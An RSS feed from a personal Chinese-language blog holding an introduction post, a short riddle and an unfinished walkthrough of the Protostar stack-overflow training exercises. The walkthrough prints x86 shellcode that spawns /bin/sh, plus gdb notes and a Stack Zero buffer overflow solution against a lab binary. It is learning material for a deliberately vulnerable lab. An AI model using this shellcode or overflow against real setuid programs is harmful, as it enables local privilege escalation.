<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Senri&#39;s Memo</title>
        <link>/</link>
        <description>Recent content on Senri&#39;s Memo</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Tue, 22 Mar 2022 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Hello World</title>
        <link>/p/about/</link>
        <pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>/p/about/</guid>
        <description>&lt;img src="/p/about/cover.jpeg" alt="Featured image of post Hello World" /&gt;&lt;p&gt;欢迎来到 Kurusu Senri 的杂物堆&lt;/p&gt;
&lt;p&gt;这里没有樱花雪花满屏飞舞；&lt;del&gt;但是因为好好看又加了回来&lt;/del&gt;&lt;br&gt;
没有 Pjax 无刷新加载；&lt;del&gt;kuso明明就是你这次弄不出来吧喂&lt;/del&gt;&lt;br&gt;
也没有打字机特效的书摘；&lt;del&gt;这个真的只是觉得没合适的地方放&lt;/del&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;也没有文章（草&lt;/p&gt;
&lt;p&gt;&lt;br&gt;或多或少是因为上一个博客有点玩腻了这些&amp;hellip;&lt;/p&gt;
&lt;p&gt;毕竟 Senri 乃抛弃了过去之人x&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（所以也千万别试图知道 Senri 曾经是谁啊啊啊啊！&lt;/p&gt;
&lt;p&gt;（毕竟得和现实保持分开来&amp;hellip;不然被认出来了就会很可怕因为是深柜 MtF&amp;hellip;
&lt;br&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;然而确实还没有想好这里到底要用来干嘛w&lt;/p&gt;
&lt;p&gt;先来一点介绍姑且&lt;/p&gt;
&lt;p&gt;Kurusu Senri · 来栖 千理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;废物高中生&lt;/p&gt;
&lt;p&gt;绝对&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;含糖 &amp;amp; 深柜 MtF&lt;/p&gt;
&lt;p&gt;三无少女（？&lt;/p&gt;
&lt;p&gt;指的是没有天赋没有年龄没有家长x&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;INFP-T&lt;/p&gt;
&lt;p&gt;感觉是个 MtF 都是 INFP-T 么&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java 苦手&lt;/p&gt;
&lt;p&gt;算是看着文档自学的x&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C# 学习中&lt;/p&gt;
&lt;p&gt;听说学 C# 的不是疯了就是变女孩子了所以我要！&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;/links&#34; &gt;要找我的话在这里&amp;hellip;&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>選択・1986.10.5・六軒島</title>
        <link>/p/senntaku/</link>
        <pubDate>Sun, 05 Oct 1986 00:00:00 +0000</pubDate>
        
        <guid>/p/senntaku/</guid>
        <description>&lt;p align=&#34;center&#34;&gt;以下に掲げる三つの内。&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;二つを得るために、一つを生贄に捧げよ。&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;一．自分の命&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;二．愛する者の命&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;三．それ以外の全員の命&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;何れも選ばねば、上記の全てを失う。&lt;/p&gt;
&lt;hr /&gt;
&lt;p align=&#34;center&#34;&gt;以下三者中&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;为了得到另外两者，必须牺牲其一&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;一．自己的生命&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;二．所爱之人的生命&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;三．初次之外的所有人的生命&lt;/p&gt;
&lt;p align=&#34;center&#34;&gt;如果不选择其中任何一项，则将会失去上述全部&lt;/p&gt;</description>
        </item>
        <item>
        <title>[unfinished] Protostar Stack 0-7 Walkthrough</title>
        <link>/p/protostar_stack_0-7/</link>
        <pubDate>Tue, 22 Mar 2022 00:00:00 +0000</pubDate>
        
        <guid>/p/protostar_stack_0-7/</guid>
        <description>&lt;img src="/p/protostar_stack_0-7/cover.png" alt="Featured image of post [unfinished] Protostar Stack 0-7 Walkthrough" /&gt;&lt;h2 id=&#34;protostar&#34;&gt;Protostar&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://exploit.education/protostar/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;☞ Protostar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Protostar introduces the following in a friendly way:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Network programming&lt;/li&gt;
&lt;li&gt;Byte order&lt;/li&gt;
&lt;li&gt;Handling sockets&lt;/li&gt;
&lt;li&gt;Stack overflows&lt;/li&gt;
&lt;li&gt;Format strings&lt;/li&gt;
&lt;li&gt;Heap overflows&lt;/li&gt;
&lt;li&gt;The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the &lt;a class=&#34;link&#34; href=&#34;https://exploit.education/fusion/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Fusion&lt;/a&gt; page.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;shell-storm&#34;&gt;shell-storm&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://shell-storm.org/shellcode/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;☞ shell-storm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有各种各样的 Shellcode&lt;/p&gt;
&lt;p&gt;比较常用的是&lt;a class=&#34;link&#34; href=&#34;http://shell-storm.org/shellcode/files/shellcode-219.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这个&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * $Id: gets-linux.c,v 1.3 2004/06/02 12:22:30 raptor Exp $
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * gets-linux.c - stdin re-open shellcode for Linux/x86
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Copyright (c) 2003 Marco Ivaldi &amp;lt;raptor@0xdeadbeef.info&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * descriptor and re-opens /dev/tty, then does an execve() of /bin/sh.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Useful to exploit some gets() buffer overflows in an elegant way...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; sc[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc0\x31\xdb\xb0\x06\xcd\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x53\x68&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/tty&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/dev&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc0\x50\x68&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;//sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/bin&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;乱七八糟的笔记&#34;&gt;乱七八糟的笔记&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;正常情况下在一个函数看来栈的布局&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;em&gt;[higher memory]&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;caller&amp;rsquo;s frame&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;argument passed by the caller&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;return address&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;saved ebp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;local variable 1 ☜ ebp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;local variable 2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;local variable 3 ☜ esp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;em&gt;[lower memory]&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;p&gt;关于 gdb 的 &lt;code&gt;x/&lt;/code&gt; 命令用法：
&lt;code&gt;x /[Length][Format] [Address expression]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;例：
&lt;code&gt;x/24wx $esp&lt;/code&gt;
&lt;code&gt;x/2i $eip&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;code&gt;define hook-stop&lt;/code&gt; 的用法：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;info registers
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;x/24wx $esp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;x/2i $eip
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;end
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;p&gt;以及：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(gdb) set disassembly-flavor intel
&lt;/code&gt;&lt;/pre&gt;&lt;hr /&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ls -al /opt/protostar/bin/ | grep stack
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;22412&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; stack0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;23196&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; stack1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;23350&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; stack2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;23130&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; stack3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;22860&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; stack4
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;22612&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; stack5
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;23331&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; stack6
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;23461&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; stack7
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;stack-zero&#34;&gt;Stack Zero&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.&lt;/p&gt;
&lt;p&gt;This level is at /opt/protostar/bin/stack0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; modified;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  modified &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  gets(buffer);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(modified &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you have changed the &amp;#39;modified&amp;#39; variable&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Try again?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;p&gt;重点是这三句话&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  modified &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  gets(buffer);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;总结来说直接输入 65 个字符就可以了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;print \&amp;#34;A\&amp;#34; * 65&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; * &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;print \&amp;#34;A\&amp;#34; * 65&amp;#34;&lt;/span&gt; &amp;gt; stack0.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ python stack0.py | /opt/protostar/bin/stack0 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;you have changed the &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;modified&amp;#39;&lt;/span&gt; variable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;stack-one&#34;&gt;Stack One&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.&lt;/p&gt;
&lt;p&gt;This level is at /opt/protostar/bin/stack1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hints&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.&lt;/li&gt;
&lt;li&gt;Protostar is little endian&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
